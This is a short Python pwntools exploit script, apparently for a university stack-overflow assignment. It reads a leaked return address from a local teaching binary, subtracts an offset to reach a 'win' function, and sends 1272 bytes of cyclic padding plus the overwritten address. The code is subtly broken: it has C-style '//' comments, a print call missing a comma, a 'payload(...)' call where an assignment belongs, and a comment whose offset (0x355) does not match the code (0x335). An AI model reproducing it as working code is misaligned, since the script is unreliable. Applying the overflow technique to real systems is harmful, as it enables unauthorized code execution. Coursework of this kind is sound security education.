#!/usr/bin/env python3
import pwn
import sys

while True:
	p = pwn.process('/Assignment5_stackoverflow2_teaching')
	out = p.clean().decode()
	
	returnAddress = out.split("Current Return Address: ")[1].split()[0] //ADDRESS CHANGES EVERYTIME
	print("Old: " returnAddress)
	
	returnAddress = int(returnAddress, 16)
	
	#0x355 = 0x5565d7688645 <main+81>(x/i -> that register) - 0x5565d7688310 (x/p win)
	
	returnAddress = returnAddress - 0x335 
	print("New: ", returnAddress)
	
	#num = 0x7ffdcd783540 - 0x7ffdcd783050 + 8 = 1272
	num = 1272
	
	payload(pwn.cyclic(num) + returnAddress.to_bytes(8, 'little'))
	
	p.send(payload)
	
	print(p.clean().decode())
	
	sys.exit()
//end stof2.py	
